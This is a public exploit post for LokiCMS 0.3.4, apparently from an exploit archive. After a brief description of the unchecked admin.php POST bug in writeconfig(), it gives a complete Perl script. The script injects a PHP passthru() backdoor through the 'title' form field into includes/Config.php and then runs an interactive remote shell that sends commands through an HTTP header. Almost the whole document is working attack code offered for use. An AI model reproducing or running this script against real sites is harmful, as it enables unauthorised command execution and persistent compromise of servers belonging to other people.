LokiCMS 0.3.4 writeconfig() Remote Command Execution Exploit
============================================================


# Author:    __GiReX__	

# CMS:       LokiCMS 0.3.4
# URL:       http://www.lokicms.com/

# Description:  LokiCMS is still vulnerable to Remote Command Execution (see: http://milw0rm.com/exploits/5408)
# The exploit changed becouse the vars changed but the bugged function is the same: writeconfig()
# LokiCMS does not check the access to admin.php via POST...

#!/usr/bin/perl -w
# LokiCMS <= 0.3.4 Remote Command Execution Exploit
# Needs with magic_quotes_gpc = Off
# Coded by __GiReX__

use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print "[-] Usage: perl $0 [host] [path]\n";
     print "[-] Example: perl $0 localhost /lokicms/\n\n";
     exit;
}

my $lwp = new LWP::UserAgent or die;
 
my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  &#039;http://&#039; . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= &#039;/&#039; unless $target =~ /^http:\/\/(.?)\/$/;

banner();
my $res = $lwp->post($target.&#039;admin.php&#039;, 
                                [ &#039;LokiACTION&#039; =>  &#039;A_SAVE_G_SETTINGS&#039;,
                                  &#039;title&#039;      =>  "&#039;;echo \"<!-- INFECTED -->\";if(strlen(\$_SERVER[&#039;HTTP_CMD&#039;]))".
                                                   "passthru(\$_SERVER[&#039;HTTP_CMD&#039;]);//", 
                                  &#039;language&#039;   =>  &#039;english-utf-8&#039;,
                                  &#039;theme&#039;      =>  &#039;default&#039; ]);

if($res->is_error)
{
    print "[-] Request mistake. Exploit terminated!\n";
    exit ();
}
							  
while(1)
{
    print "[+] shell:~\$ ";
    chomp($cmd = <STDIN>);
    last if $cmd eq &#039;exit&#039;;
     
    $lwp->default_header( &#039;CMD&#039; => $cmd );
    my $res = $lwp->get($target.&#039;includes/Config.php&#039;);
	 
    if($res->is_success and $res->content =~ /INFECTED/)
    {
        print "\n". substr($res->content, index($res->content, &#039;INFECTED&#039;) + 12)."\n";
    }
    else
    {
        print "[-] PHP Code not injected. maybe magic_quotes_gpc = On!\n";
        last;
    }
}

sub banner
{
     print "[+] LokiCMS 0.3.4 Remote Command Execution Exploit\n";
     print "[+] Coded by __GiReX__\n";
     print "\n";
}




